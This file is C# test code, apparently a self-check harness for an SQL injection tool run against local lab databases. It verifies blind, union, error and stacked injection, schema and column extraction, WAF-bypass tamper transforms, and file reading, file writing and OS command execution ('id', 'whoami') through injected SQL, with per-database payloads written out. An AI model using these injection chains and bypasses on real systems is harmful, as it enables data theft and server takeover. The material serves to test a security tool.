        for (int i = 0; i < 900 && string.IsNullOrEmpty(vmodel.Value); i++)
        {
            await Task.Delay(100);
        }
        string v = vmodel.Value ?? "";
        bool ok = v.Length > 0;
        Console.WriteLine($"[vers:{targetDb}] 环境变量链路取值长度={v.Length} 值={Truncate(v, 60)}");
        return ok ? $"PASS(vers len={v.Length})" : "FAIL(vers取值为空)";
    }

    // ---------- 2.63 n-gram字符预测A/B验证（ngram: 前缀：直读GetStringByBool盲注链路，打印纯取数请求数） ----------
    if (db.StartsWith("ngram:"))
    {
        //默认表达式随库种切换（sqlite无version()，用sqlite_version()；sqlserver用@@version）
        string ngramDefault = dbType switch
        {
            DBType.SQLite => "select sqlite_version()",
            DBType.SQLServer => "select @@version",
            DBType.H2 => "select h2version()",
            DBType.HSQLDB => "select database_version()",
            _ => "select version()"
        };
        string raw = Environment.GetEnvironmentVariable("SQLI_USER_SQL") ?? ngramDefault;
        string expr = "(" + raw.Trim().TrimEnd(';') + ")";
        long before = Interlocked.Read(ref config.RequestTmpCount);
        string v = await DataComm.GetStringByBool(config, expr, 4096);
        long used = Interlocked.Read(ref config.RequestTmpCount) - before;
        Console.WriteLine($"[ngram:{targetDb}] SQL={raw} 请求数={used} 值={Truncate(v ?? "", 80)}");
        return v != null && v.Length > 0 ? $"PASS(请求数={used})" : "FAIL(取值为空)";
    }

    // ---------- 2.65 堆叠注入验证（stacked: 前缀：堆叠检出 → 堆叠直发执行 → 写操作 → 取数回退） ----------
    if (db.StartsWith("stacked:"))
    {
        return await RunStackedVerify(config, targetDb, hits);
    }

    // ---------- 2.7 字段元数据提取验证（cols: 前缀，盲注逐列取字段名，回归各库字段模板） ----------
    //SQLI_COLS_TABLES 可指定逗号分隔多表连读（如 users,news：验证n-gram在线学习跨表提速），打印逐表请求数
    if (db.StartsWith("cols:"))
    {
        string[] tables = Environment.GetEnvironmentVariable("SQLI_COLS_TABLES") is { Length: > 0 } tEnv
            ? tEnv.Split(',').Select(s => s.Trim()).Where(s => s.Length > 0).ToArray()
            : new[] { "users" };
        //各库元数据定位名：sqlite=数据库文件main；mysql/sqlserver=库名；pgsql/kingbase=模式名；dm/oracle=owner
        string metaName = targetDb switch
        {
            "sqlite" => "main",
            "mysql" => "sqli_test",
            "mysqlc" => "sqli_test",
            "sqlserver" => "sqli_test",
            "sqlserver08" => "sqli_test",
            "pgsql" => "public",
            "kingbase" => "public",
            "dm" => "SYSDBA",
            "oracle" => "SQLI",
            "h2" => "PUBLIC",
            "hsqldb" => "PUBLIC",
            "opengauss" => "public",
            "db2" => "DB2INST1",
            "clickhouse" => "sqli_test",
            _ => "main"
        };
        bool allOk = true;
        var allNames = new List<string>();
        foreach (string table in tables)
        {
            long before = Interlocked.Read(ref config.RequestTmpCount);
            string cntPayload = PayloadFactory.BPTool.GetColumnCount(metaName, table);
            int colCount = await DataComm.GetValueLen(config, cntPayload, 0, 100);
            Console.WriteLine($"[{db}] 表 {table} 字段数: {colCount}");
            if (colCount < 1)
            {
                allOk = false;
                Console.WriteLine($"[{db}] 表 {table} 字段数=0 FAIL");
                continue;
            }
            var names = new List<string>();
            for (int i = 0; i < colCount; i++)
            {
                string p = PayloadFactory.BPTool.GetColumnName(metaName, table, i);
                string name = await DataComm.GetStringByBool(config, p, 64);
                names.Add(name);
                Console.WriteLine($"[{db}] {table} 字段[{i}]: {name}");
            }
            long used = Interlocked.Read(ref config.RequestTmpCount) - before;
            Console.WriteLine($"[{db}] 表 {table} 读取请求数={used} 字段={string.Join(",", names)}");
            if (names.Any(string.IsNullOrEmpty))
            {
                allOk = false;
            }
            allNames.AddRange(names);
        }
        //users表保留原校验（4字段 id/username/password/email），其余表只要求读到非空字段名
        if (tables.Contains("users"))
        {
            var lower = allNames.Select(n => n?.ToLowerInvariant() ?? "").ToList();
            allOk = allOk && lower.Contains("id") && lower.Contains("username") && lower.Contains("password") && lower.Contains("email");
        }
        return allOk ? $"PASS(字段提取 {string.Join(",", allNames)})" : $"FAIL(字段提取异常: {string.Join(",", allNames)})";
    }

    // ---------- 3. 利用链路取数验证 ----------
    sw.Restart();
    string data;
    switch (best.InjectType)
    {
        case InjectType.Union:
            data = await DataComm.DataDumpWithNoFrom(config, versionExpr);
            break;
        case InjectType.Error:
            data = await DataComm.DataDumpWithError(config, versionExpr);
            break;
        case InjectType.Blind:
            if (best.BoolInjectType == BoolInjectType.Time)
            {
                Console.WriteLine($"[{db}] 最优为时间盲注，跳过逐字符取数（耗时过长），仅以长度探测验证链路");
                string lenPayload = PayloadFactory.BPTool.DataLen(versionExpr);
                int len = await DataComm.GetDataLen(config, lenPayload, 1, 64);
                data = len > 0 ? $"<len={len}>" : "";
            }
            else
            {
                // 盲注逐字符较慢，只取前6个字符验证链路
                string shortExpr = dbType switch
                {
                    DBType.SQLServer => "substring(cast(@@version as nvarchar(max)),1,6)",
                    DBType.PostgreSQL => "substr(version(),1,6)",
                    DBType.SQLite => "substr(sqlite_version(),1,6)",
                    DBType.DM => "substr(user,1,6)", // 达梦：当前用户SYSDBA
                    _ => "substr(version(),1,6)"
                };
                data = await DataComm.GetStringByBool(config, shortExpr, 16);
            }
            break;
        default:
            return $"PARTIAL(检出{best.InjectType}但未执行利用)";
    }
    sw.Stop();

    if (string.IsNullOrWhiteSpace(data))
    {
        Console.WriteLine($"[{db}] 利用取数为空（耗时 {sw.Elapsed.TotalSeconds:F1}s）");
        return $"FAIL(检出{best.InjectType}/{dbType}但取数为空)";
    }
    Console.WriteLine($"[{db}] 利用取数成功（耗时 {sw.Elapsed.TotalSeconds:F1}s）: {data}");
    return $"PASS(检出{hits.Count}类: {string.Join("/", hits.Select(h => h.InjectType))}; 最优={best.InjectType}/{dbType}; 取数={Truncate(data, 40)})";
}

static string Truncate(string s, int n) => s.Length <= n ? s.Replace("\r", " ").Replace("\n", " ") : s[..n].Replace("\r", " ").Replace("\n", " ") + "...";

// 文件操作与命令执行验证：检测+应用最优注入点后，依次验证 读文件/写文件(读回)/命令执行
static async Task<string> RunFileCmd(AppConfig config, string targetDb, string tag)
{
    // DM/Oracle 无直接文件读写与命令执行方法（需Java存储过程等，工具侧标注不支持），跳过避免误测
    // HSQLDB JDBC不支持堆叠多语句，TEXT TABLE文件读写注入场景不可用；DB2工具侧无文件/命令通道
    // ClickHouse 无命令执行；file表函数仅限user_files目录，无通用读写通道，跳过
    // SQLite 无内建文件读写/命令执行SQL通道（load_extension需先写文件，工具侧未提供方法），跳过
    if (targetDb is "dm" or "oracle" or "hsqldb" or "db2" or "clickhouse" or "sqlite")
    {
        System.Console.WriteLine($"[{tag}] 文件/命令：SKIP（DM/Oracle需Java存储过程、HSQLDB不支持堆叠、DB2/ClickHouse/SQLite无对应通道，暂不支持）");
        return "文件命令SKIP(不支持)";
    }
    //mysql(3306)=本机Windows MySQL5.7，secure_file_priv锁定Uploads目录：load_file/into dumpfile出目录即被拒，
    //UDF写plugin_dir同样受限，文件/命令验证请走 filecmd:mysqlc（Linux容器secure_file_priv为空）或 wfilecmd:mysql（Uploads目录）
    if (targetDb == "mysql")
    {
        System.Console.WriteLine($"[{tag}] 文件/命令：SKIP（3306本机Windows MySQL secure_file_priv受限，请用 filecmd:mysqlc 或 wfilecmd:mysql 验证）");
        return "文件命令SKIP(3306受限,用mysqlc/wfilecmd:mysql)";
    }
    var vm = config.FileCmd;
    var results = new List<string>();

    (string readMethod, string writeMethod) = targetDb switch
    {
        "mysql" or "mysqlc" => ("Load_File读文件", "Union写文件"),
        "pgsql" => ("Copy读文件", "Copy写文件"),
        "opengauss" => ("Copy读文件", "Copy写文件"),
        "h2" => ("CSVREAD读文件", "CSVWRITE写文件"),
        _ => ("BULK INSERT读文件", "FileSystemObject写文件") // SQLServer: BULK INSERT跨平台可读；写文件sp_oacreate仅Windows（Linux预期FAIL）
    };

    // Windows靶机（如sqlserver08远程Windows SQL Server、h2本地Java靶场）：换用Windows路径与命令
    bool winTarget = targetDb is "sqlserver08" or "h2" or "hsqldb";

    // 1. 读文件
    vm.FilePath = winTarget ? "C:/Windows/win.ini" : "/etc/hostname";
    vm.SelectedFileMethod = readMethod;
    await FileCmdTools.ExecuteFile(config, vm);
    string readRes = (vm.FileContent ?? "").Trim();
    bool readOk = readRes.Length > 0;
    Console.WriteLine($"[{tag}] 读文件({readMethod} {vm.FilePath}): {(readOk ? "PASS" : "FAIL")} -> {Truncate(readRes, 40)}");
    results.Add($"读文件{(readOk ? "PASS" : "FAIL")}");

    // 2. 写文件 + 读回验证（sqlserver=Linux 2022容器：sp_oacreate仅Windows可用，写文件跳过，Windows侧由wfilecmd:sqlserver08覆盖）
    if (targetDb == "sqlserver")
    {
        Console.WriteLine($"[{tag}] 写文件: SKIP（FileSystemObject/sp_oacreate仅Windows，Linux容器不可用，见wfilecmd:sqlserver08）");
        results.Add("写文件SKIP(Linux无sp_oacreate)");
    }
    else
    {
    string wpath = winTarget ? "C:/Windows/Temp/sqli_w_test.txt" : "/tmp/sqli_w_test.txt";
    string wcontent = "hello_sqli_123";
    vm.FilePath = wpath;
    vm.FileContent = wcontent;
    vm.SelectedFileMethod = writeMethod;
    await FileCmdTools.ExecuteFile(config, vm);
    vm.FileContent = "";
    vm.SelectedFileMethod = readMethod;
    await FileCmdTools.ExecuteFile(config, vm);
    string back = (vm.FileContent ?? "").Trim();
    bool writeOk = back.Contains(wcontent);
    Console.WriteLine($"[{tag}] 写文件({writeMethod} {wpath})+读回: {(writeOk ? "PASS" : "FAIL")} -> {Truncate(back, 40)}");
    results.Add($"写文件{(writeOk ? "PASS" : "FAIL")}");
    }

    // 3. 命令执行（Linux容器用 id；Windows靶机用 whoami；H2/HSQLDB/openGauss不支持命令执行）
    if (targetDb is "h2" or "hsqldb" or "opengauss")
    {
        Console.WriteLine($"[{tag}] 命令执行: SKIP（该库无命令执行通道）");
        results.Add("命令执行SKIP(不支持)");
        return string.Join("; ", results);
    }
    //sqlserver=Linux 2022容器：xp_cmdshell在SQL Server Linux上不存在，跳过（Windows侧由wfilecmd:sqlserver08覆盖）
    if (targetDb == "sqlserver")
    {
        Console.WriteLine($"[{tag}] 命令执行: SKIP（xp_cmdshell不支持SQL Server Linux，见wfilecmd:sqlserver08）");
        results.Add("命令执行SKIP(Linux无xp_cmdshell)");
        return string.Join("; ", results);
    }
    vm.CmdText = winTarget ? "whoami" : "id";
    vm.CmdShowResult = true;
    vm.CmdResult = "";
    await FileCmdTools.ExecuteCmd(config, vm);
    string cmdRes = (vm.CmdResult ?? "").Trim();
    bool cmdOk = winTarget
        ? cmdRes.Contains("\\") && !cmdRes.Contains("不是")
        : cmdRes.Contains("uid=");
    Console.WriteLine($"[{tag}] 命令执行({vm.CmdText}): {(cmdOk ? "PASS" : "FAIL")} -> {Truncate(cmdRes, 60)}");
    results.Add($"命令执行{(cmdOk ? "PASS" : "FAIL")}");

    return string.Join("; ", results);
}

// 探针：用引擎同款发包链路，直接对比 原始/真值/假值/报错 四种响应，定位检测链路问题
static void Probe(string db)
{
    var config = new AppConfig();
    Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
    config.Host = "127.0.0.1";
    config.Port = twaPort;
    config.IsSSL = false;
    config.TimeOut = 15;

    string[] cases =
    [
        "id=1",                                  // 原始
        "id=1%20AND%201=1",                      // 真值
        "id=1%20AND%201=2",                      // 假值
        "id=1'",                                 // 触发报错
        "id=1%20AND%20SLEEP(2)",                 // 时间（仅mysql语义，其他库报错也快返回）
    ];

    foreach (var c in cases)
    {
        string reqTxt =
            $"GET /num?db={db}&{c} HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{config.Port}\r\n" +
            "User-Agent: probe\r\n" +
            "Accept: */*\r\n" +
            "Connection: close\r\n\r\n";
        var req = new HttpRequest(config, reqTxt);
        var sw = System.Diagnostics.Stopwatch.StartNew();
        HttpResponse resp;
        try
        {
            resp = HTTPTool.sendRequestRetry(req);
        }
        catch (Exception e)
        {
            Console.WriteLine($"[{c}] 发包异常: {e.Message}");
            continue;
        }
        sw.Stop();
        string body = resp.BodyTxt ?? "";
        Console.WriteLine($"[{c}] 状态={resp.StatusCode} 耗时={sw.ElapsedMilliseconds}ms 长度={body.Length}");
        Console.WriteLine("    Body片段: " + (body.Length > 160 ? body[..160] : body).Replace("\r", " ").Replace("\n", " "));
    }
}

// tamper脚本引擎自检：JS/C#两种语言各跑一个变换，另验证B1内置tamper
static void TamperTest()
{
    Console.WriteLine("===== tamper脚本引擎自检 =====");
    string payload = "1 AND 1=1 UNION SELECT version()";
    var cases = new (string name, string code, string? expect)[]
    {
        ("JS-space2comment",
            "function tamper(payload){ return payload.replaceAll(' ', '/**/'); }",
            "1/**/AND/**/1=1/**/UNION/**/SELECT/**/version()"),
        ("JS-word-boundary(QuickJS原生\\b)",
            "function tamper(payload){ return payload.replace(/\\bAND\\b/gi, '&&'); }",
            "1 && 1=1 UNION SELECT version()"),
        ("JS-lookahead(QuickJS原生前瞻)",
            "function tamper(payload){ return payload.replace(/UNION(?=\\s)/gi, 'UNI/**/ON'); }",
            "1 AND 1=1 UNI/**/ON SELECT version()"),
    };
    int pass = 0, fail = 0;
    foreach (var c in cases)
    {
        var item = new ScriptTamperModel { Name = c.name, Lang = SuperSQLInjectionV2.Bypass.ScriptLang.JavaScript, Code = c.code, Enable = true };
        string output = SuperSQLInjectionV2.Bypass.ScriptTamperEngine.Tamper(item, payload);
        bool ok = c.expect != null && output == c.expect;
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {c.name}: {output.Replace("\n", "\\n")}");
        if (ok) pass++; else fail++;
    }

    //超时中断：死循环脚本必须被QuickJS中断回调打断（严格模式应抛异常，容错模式返回原payload）
    Console.WriteLine("--- 超时中断自检 ---");
    var loopItem = new ScriptTamperModel { Name = "deadloop", Code = "function tamper(p){ while(true){} return p; }", Enable = true };
    int oldTimeout = SuperSQLInjectionV2.Bypass.ScriptTamperEngine.TimeOutMs;
    SuperSQLInjectionV2.Bypass.ScriptTamperEngine.TimeOutMs = 1500;
    var swLoop = System.Diagnostics.Stopwatch.StartNew();
    string loopOut = SuperSQLInjectionV2.Bypass.ScriptTamperEngine.Tamper(loopItem, "abc");
    swLoop.Stop();
    SuperSQLInjectionV2.Bypass.ScriptTamperEngine.TimeOutMs = oldTimeout;
    bool okLoop = loopOut == "abc" && swLoop.ElapsedMilliseconds < 8000;
    Console.WriteLine($"[{(okLoop ? "PASS" : "FAIL")}] 死循环脚本被中断({swLoop.ElapsedMilliseconds}ms)，原样返回payload");
    if (okLoop) pass++; else fail++;

    //上下文池性能：同脚本1000次调用总耗时（原Jint每次new Engine约1-5ms，池化后应为微秒级/次）
    Console.WriteLine("--- 上下文池性能基准 ---");
    var benchItem = new ScriptTamperModel { Name = "bench", Code = "function tamper(p){ return p.replace(/ /g, '/**/'); }", Enable = true };
    SuperSQLInjectionV2.Bypass.ScriptTamperEngine.Tamper(benchItem, payload); // 预热建池
    var swBench = System.Diagnostics.Stopwatch.StartNew();
    for (int i = 0; i < 1000; i++)
    {
        SuperSQLInjectionV2.Bypass.ScriptTamperEngine.Tamper(benchItem, payload);
    }
    swBench.Stop();
    double perCall = swBench.Elapsed.TotalMilliseconds / 1000.0;
    bool okBench = perCall < 0.5; // 池化后单次应远低于0.5ms
    Console.WriteLine($"[{(okBench ? "PASS" : "FAIL")}] 1000次调用总耗时 {swBench.ElapsedMilliseconds}ms（均值 {perCall:F3}ms/次）");
    if (okBench) pass++; else fail++;

    //B1内置编码工具抽查（统一链路：EncodeTools）
    Console.WriteLine("--- B1内置编码工具抽查 ---");
    var byPass = new ByPassConfig();
    byPass.EncodeTools.Add(new EncodeToolModel { Name = "space2comment", Key = "space2comment", Builtin = true, Enable = true });
    byPass.EncodeTools.Add(new EncodeToolModel { Name = "equaltolike", Key = "equaltolike", Builtin = true, Enable = false });
    bool migrated = byPass.EncodeTools.Count == 2
        && byPass.EncodeTools.Any(t => t.Key == "space2comment") && byPass.EncodeTools.Any(t => t.Key == "equaltolike");
    Console.WriteLine($"[{(migrated ? "PASS" : "FAIL")}] 内置工具入链: {string.Join(",", byPass.EncodeTools.Select(t => t.Key))}");
    if (migrated) pass++; else fail++;
    var config = new AppConfig();
    config.ByPassConfig = byPass;
    string reqTxt = "GET /num?id=1<Encode> AND 1=1 UNION SELECT version()</Encode> HTTP/1.1\r\nHost: x\r\n\r\n";
    var hr = new HttpRequest(config, reqTxt);
    var replaced = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenter(hr);
    string line = replaced.HeaderAndBody.Split("\r\n")[0];
    bool ok2 = line.Contains("%2f**%2fAND") || line.Contains("/**/AND");
    Console.WriteLine($"[{(ok2 ? "PASS" : "FAIL")}] B1-Space2Comment: {line}");
    if (ok2) pass++; else fail++;

    var byPass2 = new ByPassConfig();
    byPass2.EncodeTools.Add(new EncodeToolModel { Name = "halfversionedmorekeywords-full", Key = "halfversionedmorekeywords-full", Builtin = true, Enable = true });
    var config2 = new AppConfig();
    config2.ByPassConfig = byPass2;
    string reqTxt2 = "GET /num?id=1<Encode> AND 1=1 UNION SELECT version()</Encode> HTTP/1.1\r\nHost: x\r\n\r\n";
    var hr2 = new HttpRequest(config2, reqTxt2);
    var replaced2 = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenter(hr2);
    string line2 = replaced2.HeaderAndBody.Split("\r\n")[0];
    bool ok3 = (line2.Contains("/*!0UNION*/") || line2.Contains("%2f*!0UNION*%2f")) && (line2.Contains("/*!0SELECT*/") || line2.Contains("%2f*!0SELECT*%2f"));
    Console.WriteLine($"[{(ok3 ? "PASS" : "FAIL")}] B1-HalfVersioned(全包裹变体): {line2}");
    if (ok3) pass++; else fail++;

    Console.WriteLine($"===== tamper自检结果: PASS={pass} FAIL={fail} =====");
}

// 编码工具位置作用域（EncodePos）自检：换行/控制符类工具仅在编码位（query/URI段/urlencoded体）生效，
// 原文位（头/Cookie/JSON体）块跳过——避免产物换行被CRLF防护剔除导致静默失效
static void PosScopeTest()
{
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail)
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}: {detail}");
        if (ok) pass++; else fail++;
    }

    //P1 注册表元数据：换行/控制符类工具=QueryOnly，常规工具默认Any
    bool meta1 = EncodeToolRegistry.TryGet("space2dash", out EncodeTool td) && td.Pos == EncodePos.QueryOnly
        && EncodeToolRegistry.TryGet("space2hash", out EncodeTool th) && th.Pos == EncodePos.QueryOnly
        && EncodeToolRegistry.TryGet("space2randomblank", out EncodeTool tr) && tr.Pos == EncodePos.QueryOnly
        && EncodeToolRegistry.TryGet("space2mssqlblank", out EncodeTool tm) && tm.Pos == EncodePos.QueryOnly;
    Check("注册表-换行/控制符类工具Pos=QueryOnly", meta1, "space2dash/space2hash/space2randomblank/space2mssqlblank");
    bool meta2 = EncodeToolRegistry.TryGet("space2comment", out EncodeTool tc) && tc.Pos == EncodePos.Any
        && EncodeToolRegistry.TryGet("uppercase", out EncodeTool tu) && tu.Pos == EncodePos.Any;
    Check("注册表-常规工具Pos默认Any", meta2, "space2comment/uppercase");

    //P2 QueryOnly内置步骤：编码位块（query）生效，原文位块（Cookie头）跳过
    var bp2 = new ByPassConfig();
    bp2.EncodeTools.Add(new EncodeToolModel { Name = "空格转--注释", Key = "space2dash", Builtin = true, Enable = true });
    var cfg2 = new AppConfig();
    cfg2.ByPassConfig = bp2;
    string reqTxt = "GET /t?id=1<Encode> AND 1=1</Encode> HTTP/1.1\r\nHost: x\r\nCookie: a=<Encode> AND 2=2</Encode>\r\n\r\n";
    var r2 = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenter(new HttpRequest(cfg2, reqTxt));
    string[] lines2 = r2.HeaderAndBody.Split("\r\n");
    string reqLine = lines2[0];
    string cookieLine = lines2.First(x => x.StartsWith("Cookie:", StringComparison.Ordinal));
    bool p2a = !reqLine.Contains(" AND ", StringComparison.Ordinal)
        && (reqLine.Contains("%0A", StringComparison.OrdinalIgnoreCase) || reqLine.Contains("--", StringComparison.Ordinal));
    Check("QueryOnly-编码位块已变换", p2a, reqLine);
    bool p2b = cookieLine.Contains("<Encode> AND 2=2</Encode>".Replace("<Encode>", "").Replace("</Encode>", ""), StringComparison.Ordinal)
        && cookieLine.Contains(" AND 2=2", StringComparison.Ordinal);
    Check("QueryOnly-原文位块（Cookie）跳过保持原文", p2b, cookieLine);

    //P3 RawOnly自定义JS步骤：原文位块生效，编码位块跳过
    var bp3 = new ByPassConfig();
    bp3.EncodeTools.Add(new EncodeToolModel
    {
        Name = "rawxor", Builtin = false, Enable = true, ApplyPos = EncodePos.RawOnly,
        Code = "function tamper(p){return p.replaceAll('AND','XOR');}"
    });
    var cfg3 = new AppConfig();
    cfg3.ByPassConfig = bp3;
    var r3 = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenter(new HttpRequest(cfg3, reqTxt));
    string[] lines3 = r3.HeaderAndBody.Split("\r\n");
    string cookieLine3 = lines3.First(x => x.StartsWith("Cookie:", StringComparison.Ordinal));
    bool p3a = cookieLine3.Contains(" XOR 2=2", StringComparison.Ordinal);
    Check("RawOnly-原文位块（Cookie）已变换", p3a, cookieLine3);
    bool p3b = !lines3[0].Contains("XOR", StringComparison.Ordinal);
    Check("RawOnly-编码位块（query）跳过", p3b, lines3[0]);

    //P4 Any自定义JS步骤：两个位置都生效
    var bp4 = new ByPassConfig();
    bp4.EncodeTools.Add(new EncodeToolModel
    {
        Name = "anyxor", Builtin = false, Enable = true, ApplyPos = EncodePos.Any,
        Code = "function tamper(p){return p.replaceAll('AND','XOR');}"
    });
    var cfg4 = new AppConfig();
    cfg4.ByPassConfig = bp4;
    var r4 = SuperSQLInjectionV2.Bypass.StringReplace.StrReplaceCenter(new HttpRequest(cfg4, reqTxt));
    string[] lines4 = r4.HeaderAndBody.Split("\r\n");
    bool p4 = lines4[0].Contains("XOR", StringComparison.Ordinal)
        && lines4.First(x => x.StartsWith("Cookie:", StringComparison.Ordinal)).Contains(" XOR 2=2", StringComparison.Ordinal);
    Check("Any-编码位与原文位块均生效", p4, lines4[0]);

    //P5 计划层传播：内置取注册表Pos、自定义取模型ApplyPos
    var planChk = BypassPlan.Build(bp2);
    bool p5a = planChk.PayloadSteps.Length == 1 && planChk.PayloadSteps[0].Pos == EncodePos.QueryOnly;
    Check("计划层-内置步骤Pos取自注册表", p5a, $"Pos={planChk.PayloadSteps[0].Pos}");
    var planChk3 = BypassPlan.Build(bp3);
    bool p5b = planChk3.PayloadSteps.Length == 1 && planChk3.PayloadSteps[0].Pos == EncodePos.RawOnly;
    Check("计划层-自定义步骤Pos取自模型", p5b, $"Pos={planChk3.PayloadSteps[0].Pos}");

    //P6 ApplyPos持久化往返（源生成上下文，枚举按数字序列化）
    var bp6 = new ByPassConfig();
    bp6.EncodeTools.Add(new EncodeToolModel { Name = "p6", Builtin = false, Code = "function tamper(p){return p;}", ApplyPos = EncodePos.RawOnly, Enable = true });
    string json6 = System.Text.Json.JsonSerializer.Serialize(bp6, SuperSQLInjectionV2.Source.JsonCtx.Compact);
    var back6 = System.Text.Json.JsonSerializer.Deserialize<ByPassConfig>(json6, SuperSQLInjectionV2.Source.JsonCtx.Compact);
    bool p6 = back6?.EncodeTools.Count == 1 && back6.EncodeTools[0].ApplyPos == EncodePos.RawOnly;
    Check("ApplyPos序列化往返保留", p6, json6.Length > 160 ? json6.Substring(0, 160) : json6);

    //P7 作用域代码模板：报文级模板输入为整份报文且与Payload级模板不同
    string tplPayload = SuperSQLInjectionV2.Dialogs.ScriptTamperEditViewModel.DefaultCodeFor(ScriptScope.Payload);
    string tplRequest = SuperSQLInjectionV2.Dialogs.ScriptTamperEditViewModel.DefaultCodeFor(ScriptScope.Request);
    bool p7 = tplPayload.Contains("function tamper(payload)", StringComparison.Ordinal)
        && tplRequest.Contains("function tamper(request)", StringComparison.Ordinal)
        && tplRequest.Contains("HTTP", StringComparison.Ordinal)
        && tplPayload != tplRequest;
    Check("作用域默认模板区分（Payload/报文级）", p7, tplRequest.Split('\n')[1]);

    Console.WriteLine($"===== posscope自检结果: PASS={pass} FAIL={fail} =====");
    if (fail > 0) Environment.Exit(1);
}

// 任意SQL执行封装验证：检测+应用最优注入点后，执行一条与版本探测无关的用户SQL，验证 --sql-query 链路
static async Task<string> RunUserSqlVerify(AppConfig config, string targetDb, DBType dbType)
{
    //环境变量 SQLI_USER_SQL 可覆盖默认验证SQL（用于长数据截断/分片场景验证）
    string? overrideSql = Environment.GetEnvironmentVariable("SQLI_USER_SQL");
    string userSql = !string.IsNullOrWhiteSpace(overrideSql) ? overrideSql : dbType switch
    {
        DBType.MySQL => "select concat_ws('<>',current_user(),database(),@@version_compile_os)",
        DBType.PostgreSQL => "select concat_ws('<>',current_user,current_database(),version())",
        DBType.SQLServer => "select concat_ws('<>',user_name(),db_name(),@@version)",
        DBType.DM => "select concat_ws('<>',user,database())",
        DBType.SQLite => "select sqlite_version()",
        _ => "select version()"
    };
    var sw = System.Diagnostics.Stopwatch.StartNew();
    long reqBefore = Interlocked.Read(ref config.RequestTmpCount);
    string data = await DataComm.RunUserSql(config, userSql);
    long reqCount = Interlocked.Read(ref config.RequestTmpCount) - reqBefore;
    sw.Stop();
    if (string.IsNullOrWhiteSpace(data))
    {
        Console.WriteLine($"[sql:{targetDb}] 任意SQL执行为空（耗时 {sw.Elapsed.TotalSeconds:F1}s，请求 {reqCount} 次）");
        return $"FAIL(任意SQL执行为空)";
    }
    //SQLI_DEBUG_HEX=1 时输出结果的UTF-8字节hex（排查乱码是值错还是终端显示错）
    if (Environment.GetEnvironmentVariable("SQLI_DEBUG_HEX") == "1")
    {
        Console.WriteLine($"[sql:{targetDb}] 结果UTF-8字节: {BitConverter.ToString(System.Text.Encoding.UTF8.GetBytes(data))} | 码点: {string.Join(",", data.Select(c => "U+" + ((int)c).ToString("X4")))}");
    }
    Console.WriteLine($"[sql:{targetDb}] 任意SQL执行成功（耗时 {sw.Elapsed.TotalSeconds:F1}s，请求 {reqCount} 次）: {data}");
    return $"PASS(任意SQL={Truncate(data, 50)})";
}

// 堆叠注入链路验证：检测出堆叠点 → RunStackedSql延时证明多语句执行 → 堆叠写（建表/插数据+条件延时回证）→ 取数回退（时间盲注）
static async Task<string> RunStackedVerify(AppConfig config, string targetDb, List<InjectPoint> hits)
{
    var stk = hits.FirstOrDefault(h => h.InjectType == InjectType.Stacked);
    if (stk == null)
    {
        Console.WriteLine($"[stacked:{targetDb}] 未检出堆叠注入点");
        return "SKIP(未检出堆叠)";
    }
    Console.WriteLine($"[stacked:{targetDb}] 命中堆叠注入点: DB={stk.DBType}, CheckValue={stk.CheckValue}");
    //应用堆叠注入点（与RestoreInjectRecord等效：堆叠携带时间盲注oracle）
    config.DataConfig.SelectedInjectType = InjectType.Stacked;
    config.DataConfig.SelectBoolInject = stk.BoolInjectType;
    config.DataConfig.CheckValue = stk.CheckValue;
    config.RequestTxt = stk.RequestTxt;

    //各库堆叠语句：延时探针 / 建表 / 插入 / 条件延时回证 / 删表
    var sql = targetDb switch
    {
        "mysql" or "mysqlc" => (sleep: "select sleep(2)", drop: "drop table if exists sqli_stk",
                    create: "create table sqli_stk(x varchar(50))", insert: "insert into sqli_stk values('OK')",
                    cond: "select if((select x from sqli_stk limit 1)='OK',sleep(2),0)", threshold: 1600),
        "pgsql" or "kingbase" or "opengauss" => (sleep: "select pg_sleep(2)", drop: "drop table if exists sqli_stk",
                    create: "create table sqli_stk(x varchar(50))", insert: "insert into sqli_stk values('OK')",
                    cond: "select case when (select x from sqli_stk limit 1)='OK' then pg_sleep(2) else null end", threshold: 1600),
        "sqlserver" or "sqlserver08" => (sleep: "waitfor delay '0:0:2'", drop: "if object_id('sqli_stk') is not null drop table sqli_stk",
                    create: "create table sqli_stk(x varchar(50))", insert: "insert into sqli_stk values('OK')",
                    cond: "if (select top 1 x from sqli_stk)='OK' waitfor delay '0:0:2'", threshold: 1600),
        "sqlite" => (sleep: "with recursive stk_c(x) as (select 1 union all select x+1 from stk_c where x<20000000) select count(*) from stk_c", drop: "drop table if exists sqli_stk",
                    create: "create table sqli_stk(x text)", insert: "insert into sqli_stk values('OK')",
                    cond: "select case when (select x from sqli_stk limit 1)='OK' then (with recursive stk_c(x) as (select 1 union all select x+1 from stk_c where x<20000000) select count(*) from stk_c) else 1 end", threshold: 1600),
        //达梦DM8：DmProvider支持分号多语句，但批内不支持DDL（create/drop报"不支持的语句类型"），写验证改用users表DML；
        //延时回证用WHERE过滤形态：DM对CASE中的函数提前求值（真假都延时）、EXISTS不求值SELECT列表（真假都不延时），均不可作oracle
        "dm" => (sleep: "select dbms_pipe.receive_message('dmx',2) from dual", drop: "delete from users where id=995",
                    create: "select 1 from dual", insert: "insert into users(id,username,password,email) values(995,'stk','x','x')",
                    cond: "select dbms_pipe.receive_message('dmx',2) from dual where (select username from users where id=995)='stk'", threshold: 1600),
        _ => (sleep: "", drop: "", create: "", insert: "", cond: "", threshold: 0)
    };
    if (string.IsNullOrEmpty(sql.sleep))
    {
        return "SKIP(该库未配置堆叠验证语句)";
    }

    var tags = new List<string>();
    //A. 堆叠直发执行验证：堆叠sleep，响应耗时应≥阈值（证明多语句真正执行）
    var sw = System.Diagnostics.Stopwatch.StartNew();
    await DataComm.RunStackedSql(config, sql.sleep);
    sw.Stop();
    bool execOk = sw.ElapsedMilliseconds >= sql.threshold;
    Console.WriteLine($"[stacked:{targetDb}] 堆叠执行验证: 耗时{sw.ElapsedMilliseconds}ms（阈值{sql.threshold}ms）→ {(execOk ? "PASS" : "FAIL")}");
    tags.Add(execOk ? "执行PASS" : "执行FAIL");

